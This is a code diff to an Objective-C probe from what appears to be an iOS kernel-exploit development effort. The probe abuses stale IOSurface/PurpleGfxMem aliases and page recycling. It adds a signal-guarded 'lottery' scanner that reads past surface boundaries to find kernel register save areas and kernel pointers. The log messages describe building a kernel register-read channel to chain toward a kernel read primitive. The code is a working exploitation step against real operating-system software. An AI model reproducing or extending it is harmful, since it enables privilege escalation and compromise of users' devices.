@@ -26,14 +26,20 @@
 //    P1  batch A: 64 PurpleGfxMem surfaces (0x4000, CacheMode 0x100 — the
 //        P102-proven recipe) + a memory entry over each base + an alias
 //        mapping + a per-slot A marker.
-//    P2  release A, create batch B (the SAME size/region) with per-slot B
-//        markers -> CONTROL: do the stale aliases show B's content? That
-//        is the corpus-proven carveout recycle; if it misses, the test is
-//        INCONCLUSIVE on this build (printed honestly, not as a negative).
-//    P3  spawn 32 NEON witness threads whose v0..v31 carry
+//    P2  arm 32 NEON witness threads whose v0..v31 carry
 //        0x4e45_0000_<wid>_<q>; the kernel saves them on every preemption.
-//        Scan the 64 stale aliases for that magic -> TEST.
-//    P4  verdict. PANIC-FREE. Never sets hasKread.
+//    P3  release A, create batch B (the SAME size/region) with per-slot B
+//        markers -> CONTROL: do the stale aliases show B's content? That
+//        is the corpus-proven carveout recycle. Scan the aliases for the
+//        NEON magic while we are there.
+//    P4  THE P159 LOTTERY (v2): the proven scanner (33%/round on 23F77)
+//        retargeted at the NEON magic — 16 rounds x 50 default-region
+//        surfaces, a delta-0x4000 VA adjacency, then a 0x10000 read-only
+//        scan from the second base (the Rust505 technique). This is the
+//        "is P159 usable with NEON" answer: P159's window is a repeatable
+//        KERNEL-WINDOW READER; the NEON magic is the target pattern that
+//        turns it from a kptr lottery into a thread-save-buffer detector.
+//    P5  verdict. PANIC-FREE. Never sets hasKread.
 //
 
 #import "P180NeonStackAlias.h"
@@ -47,10 +53,12 @@
 #import <mach/mach.h>
 #import <mach/vm_map.h>
 #import <pthread.h>
+#import <setjmp.h>
+#import <signal.h>
 #import <string.h>
 #import <unistd.h>
 
-#define P180_BUILD   @"p180-neon-stack-alias-v1"
+#define P180_BUILD   @"p180-neon-stack-alias-v2-p159"
 #define P180_N       64
 #define P180_SIZE    0x4000
 #define P180_WITNESS 32
@@ -90,6 +98,15 @@ static void *g_p180_b[P180_N];
 
 static volatile int g_p180_quit;
 static uint64_t g_p180_magic[P180_WITNESS][64] __attribute__((aligned(16)));
+
+static sigjmp_buf g_p180_jmp;
+static volatile sig_atomic_t g_p180_faulted;
+
+static void p180_fault(int sig, siginfo_t *si, void *uc) {
+    (void)sig; (void)si; (void)uc;
+    g_p180_faulted = 1;
+    siglongjmp(g_p180_jmp, 1);
+}
 
 static void *p180_witness_fn(void *arg) {
     int k = (int)(intptr_t)arg;
@@ -214,7 +231,26 @@ static void *p180_witness_fn(void *arg) {
         return log;
     }
 
-    /* ── P2: release A, create B -> the CONTROL (carveout recycle) ── */
+    /* ── P2: arm the 32 NEON witnesses FIRST (every scan below can then see
+       the magic — the kernel saves v0..v31 on every preemption). ── */
+    pthread_t wth[P180_WITNESS];
+    int wStarted = 0;
+    g_p180_quit = 0;
+    for (int k = 0; k < P180_WITNESS; k++) {
+        for (int q = 0; q < 64; q++)
+            g_p180_magic[k][q] = P180_NEON | ((uint64_t)k << 32) | (uint64_t)q;
+        if (pthread_create(&wth[k], NULL, p180_witness_fn, (void *)(intptr_t)k) == 0)
+            wStarted++;
+        else
+            wth[k] = 0;
+    }
+    L([NSString stringWithFormat:@"[P2] NEON witnesses armed: %d/%d (the kernel "
+       @"saves v0..v31 on every preemption; the magic is 0x4e45_0000_<wid>_<q>)",
+       wStarted, P180_WITNESS]);
+    usleep(80000);   /* let every witness cycle the save/restore path */
+
+    /* ── P3: release A, create B -> the CONTROL (carveout recycle) + the
+       stale-alias magic scan. ── */
     for (int i = 0; i < P180_N; i++) {
         if (g_p180[i].surf) { CFRelease((CFTypeRef)g_p180[i].surf); g_p180[i].surf = NULL; }
     }
@@ -231,11 +267,12 @@ static void *p180_witness_fn(void *arg) {
         g_p180_b[i] = surf;
         bMarked++;
     }
-    L([NSString stringWithFormat:@"[P2] batch B: create=%d marked=%d "
+    L([NSString stringWithFormat:@"[P3] batch B: create=%d marked=%d "
        @"(A released first — the recycle window)", bMade, bMarked]);
 
     int recycleAliases = 0;
     uint64_t recycleFirst = 0;
+    uint64_t neonFirst = 0, neonAt = 0, kptrFirst = 0;
     for (int i = 0; i < P180_N; i++) {
         if (!g_p180[i].alias) continue;
         volatile uint64_t *p = (volatile uint64_t *)g_p180[i].alias;
@@ -244,84 +281,121 @@ static void *p180_witness_fn(void *arg) {
         for (size_t q = 0; q < n; q++) {
             uint64_t v = p[q];
             if ((v & P180_B_MASK) == P180_B_PREFIX) { hit = 1; if (!recycleFirst) recycleFirst = v; }
+            if ((v & P180_NEON_MASK) == P180_NEON && !neonFirst) { neonFirst = v; neonAt = (uint64_t)i; }
+            if (((v >> 40) == 0xFFFFFEULL || (v >> 40) == 0xFFFFFFULL) && !kptrFirst) kptrFirst = v;
         }
         if (hit) recycleAliases++;
     }
-    L([NSString stringWithFormat:@"[P2] CONTROL recycle: %d/%d stale aliases "
+    L([NSString stringWithFormat:@"[P3] CONTROL recycle: %d/%d stale aliases "
        @"now hold a B marker%@", recycleAliases, aMapped,
        recycleAliases ? @" — the carveout REUSED pages (the corpus law reproduces here)"
                       : @" — no recycle seen; the thread test below is INCONCLUSIVE, not a negative"]);
 
-    /* ── P3: the 32 NEON witnesses + the magic scan ── */
-    pthread_t wth[P180_WITNESS];
-    int wStarted = 0;
-    g_p180_quit = 0;
-    for (int k = 0; k < P180_WITNESS; k++) {
-        for (int q = 0; q < 64; q++)
-            g_p180_magic[k][q] = P180_NEON | ((uint64_t)k << 32) | (uint64_t)q;
-        if (pthread_create(&wth[k], NULL, p180_witness_fn, (void *)(intptr_t)k) == 0)
-            wStarted++;
-        else
-            wth[k] = 0;
-    }
-    L([NSString stringWithFormat:@"[P3] NEON witnesses armed: %d/%d (the kernel "
-       @"saves v0..v31 on every preemption; the magic is 0x4e45_0000_<wid>_<q>)",
-       wStarted, P180_WITNESS]);
+    /* ── P4: THE P159 LOTTERY — the proven scanner (33%/round on 23F77)
+       retargeted at the NEON magic. Create 50 default-region surfaces, find
+       a delta-0x4000 VA adjacency, scan 0x10000 from the second base (the
+       Rust505 technique, read-only). Any 0x4e45 magic in the window = the
+       save area is reachable through a window we can read. ── */
+    struct sigaction sa, old_segv, old_bus;
+    memset(&sa, 0, sizeof sa);
+    sa.sa_sigaction = p180_fault;
+    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
+    sigemptyset(&sa.sa_mask);
+    sigaction(SIGSEGV, &sa, &old_segv);
+    sigaction(SIGBUS, &sa, &old_bus);
 
-    int neonAliases = 0, kptrAliases = 0;
-    uint64_t neonFirst = 0, neonAt = 0, kptrFirst = 0;
-    for (int round = 0; round < 40; round++) {
-        for (int i = 0; i < P180_N; i++) {
-            if (!g_p180[i].alias) continue;
-            volatile uint64_t *p = (volatile uint64_t *)g_p180[i].alias;
-            size_t n = P180_SIZE / 8;
-            for (size_t q = 0; q < n; q++) {
-                uint64_t v = p[q];
-                if ((v & P180_NEON_MASK) == P180_NEON) {
-                    if (!neonFirst) { neonFirst = v; neonAt = (uint64_t)i; }
-                    neonAliases |= 1 << 0;   /* counted per round below */
-                }
-                if ((v >> 40) == 0xFFFFFEULL || (v >> 40) == 0xFFFFFFULL) {
-                    if (!kptrFirst) kptrFirst = v;
-                    kptrAliases = 1;
-                }
+    int lotRounds = 0, lotAdj = 0, lotKptr = 0;
+    uint64_t lotNeon = 0, lotNeonOff = 0;
+    CFDictionaryRef props159 = (__bridge CFDictionaryRef)@{
+        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+        @"IOSurfaceBytesPerElement": @4,
+        @"IOSurfacePixelFormat": @0x42475241,
+    };
+    for (int round = 0; round < 16 && !neonFirst && !lotNeon; round++) {
+        void *surfs[50]; uintptr_t bases[50]; int n = 0;
+        for (int i = 0; i < 50; i++) {
+            void *s2 = pCreate(props159);
+            if (!s2) continue;
+            void *b = pBase(s2);
+            if (!b) { CFRelease((CFTypeRef)s2); continue; }
+            surfs[n] = s2; bases[n] = (uintptr_t)b; n++;
+        }
+        int idx = -1;
+        for (int i = 0; i < n - 1; i++) {
+            if (bases[i] && bases[i + 1] && bases[i + 1] - bases[i] == 0x4000) {
+                idx = i; break;
             }
         }
-        /* the per-round alias count is what matters: a hit in ANY round */
-        if (neonFirst) break;
-        usleep(10000);
+        if (n < 2) { for (int i = 0; i < n; i++) CFRelease((CFTypeRef)surfs[i]); continue; }
+        if (idx < 0) {
+            for (int i = 0; i < n; i++) CFRelease((CFTypeRef)surfs[i]);
+            continue;
+        }
+        lotAdj++;
+        uintptr_t b2 = bases[idx + 1];
+        for (uintptr_t addr = b2; addr < b2 + 0x10000; addr += 8) {
+            uint64_t v = 0;
+            g_p180_faulted = 0;
+            if (sigsetjmp(g_p180_jmp, 1) == 0) {
+                v = *(volatile uint64_t *)addr;
+            } else {
+                break;
+            }
+            if (!v) continue;
+            if ((v & P180_NEON_MASK) == P180_NEON) {
+                lotNeon = v; lotNeonOff = (uint64_t)(addr - b2);
+                break;
+            }
+            if ((v >> 40) == 0xFFFFFEULL || (v >> 40) == 0xFFFFFFULL) lotKptr++;
+        }
+        for (int i = 0; i < n; i++) CFRelease((CFTypeRef)surfs[i]);
+        lotRounds++;
     }
+    sigaction(SIGSEGV, &old_segv, NULL);
+    sigaction(SIGBUS, &old_bus, NULL);
+    L([NSString stringWithFormat:@"[P4] P159 lottery: rounds=%d adjacency=%d "
+       @"kernel-shaped=%d neon=%@ (the proven scanner, retargeted at the magic)",
+       lotRounds, lotAdj, lotKptr,
+       lotNeon ? [NSString stringWithFormat:@"*** HIT 0x%016llx at +0x%llx ***",
+                  (unsigned long long)lotNeon, (unsigned long long)lotNeonOff]
+               : @"none"]);
+
     g_p180_quit = 1;
     for (int k = 0; k < P180_WITNESS; k++)
         if (wth[k]) pthread_join(wth[k], NULL);
 
-    L([NSString stringWithFormat:@"[P3] TEST neon: %@", neonFirst
-        ? [NSString stringWithFormat:@"*** HIT — a stale alias holds the NEON "
-           @"magic 0x%016llx at slot %llu: KERNEL REGISTER STATE READABLE "
-           @"WITH NO WRITE ***", (unsigned long long)neonFirst,
+    if (!neonFirst && lotNeon) { neonFirst = lotNeon; neonAt = lotNeonOff; }
+
+    L([NSString stringWithFormat:@"[P4] TEST neon (stale aliases): %@", neonFirst
+        ? [NSString stringWithFormat:@"*** HIT — a window we can read holds the "
+           @"NEON magic 0x%016llx (slot/off %llu): KERNEL REGISTER STATE "
+           @"READABLE WITH NO WRITE ***", (unsigned long long)neonFirst,
            (unsigned long long)neonAt]
-        : @"no NEON magic in any stale alias this window"]);
-    L([NSString stringWithFormat:@"[P3] kernel-shaped qwords in the aliases: %@",
+        : @"no NEON magic in any alias or lottery window this tap"]);
+    L([NSString stringWithFormat:@"[P4] kernel-shaped qwords in the aliases: %@",
        kptrFirst ? [NSString stringWithFormat:@"YES first=0x%016llx (informational)",
                     (unsigned long long)kptrFirst]
                  : @"none"]);
 
-    /* ── P4: verdict ── */
+    /* ── P5: verdict ── */
     L(@"");
     L(@"=== VERDICT ===");
     if (neonFirst) {
         L(@"[+] THE BRIDGE EXISTS: a thread save area was reachable through a "
-          @"stale PurpleGfxMem alias. That is a KERNEL REGISTER-READ channel "
-          @"with no write primitive — pair it with the NEON transport and the "
-          @"A6 count sweep. hasKread still flips ONLY via kread32(kbase).");
-    } else if (recycleAliases == 0) {
-        L(@"[=] INCONCLUSIVE: the carveout did not recycle pages on this build, "
-          @"so the thread question was never actually asked. Re-run on a build "
-          @"where the CONTROL hits (the corpus measured 27.0/27.0.1).");
+          @"window we can read (the stale alias or the P159 lottery). That is a "
+          @"KERNEL REGISTER-READ channel with no write primitive — pair it with "
+          @"the NEON transport and the A6 count sweep. hasKread still flips "
+          @"ONLY via kread32(kbase).");
+    } else if (recycleAliases > 0 || lotAdj > 0) {
+        L([NSString stringWithFormat:@"[-] NEGATIVE ON THIS BUILD: the scanners "
+           @"ran (recycle=%d/%d, lottery adjacency=%d) and saw kernel-shaped "
+           @"data — but never the NEON magic. The thread save buffer does not "
+           @"land in these pools: the P102 canary does NOT connect to NEON.",
+           recycleAliases, aMapped, lotAdj]);
     } else {
-        L(@"[-] NEGATIVE ON THIS BUILD: the carveout recycles surface pages "
-          @"(CONTROL hit) but never into a thread save buffer — the thread "
-          @"zone is a different pool. The P102 canary does NOT connect to NEON.");
+        L(@"[=] INCONCLUSIVE: neither scanner got a window on this build "
+          @"(no recycle, no adjacency) — the thread question was never asked. "
+          @"Re-run where the CONTROL hits (the corpus measured 27.0/27.0.1).");
     }
     L(@"cs2 note: a cs2 hit is an inpcb/socket ADDRESS, not a corruption "
       @"detector, and inpcb/socket carry no thread pointer — so cs2 hits "
